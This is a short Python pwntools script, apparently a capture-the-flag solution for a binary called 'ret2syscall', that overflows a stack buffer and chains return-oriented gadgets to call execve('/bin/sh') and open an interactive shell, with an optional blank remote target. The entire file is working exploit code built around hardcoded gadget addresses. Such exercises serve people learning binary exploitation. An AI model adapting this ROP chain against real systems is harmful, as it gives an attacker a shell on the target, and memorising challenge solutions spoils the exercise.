#!/usr/bin/env python3
from pwn import *

context.binary = './ret2syscall'
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'DEBUG'

if args.REMOTE:
    ip = ''
    port = 0
    p = remote(ip, port)
else:
    p = process()

pop_rax_rdx_rbx_ret = 0x460086

pop_rdi_rsi_rdx_r10_ret = 0x40115c
pop_rdi_ret = 0x402090
pop_rsi_ret = 0x404c4c

syscall = 0x40128b

bin_sh = 0x472010

payload = flat([b'A'*(4+8), pop_rdi_ret, bin_sh, pop_rax_rdx_rbx_ret, 0x3b, 0, 0, pop_rsi_ret, 0, syscall])

p.sendline(payload)




p.interactive()
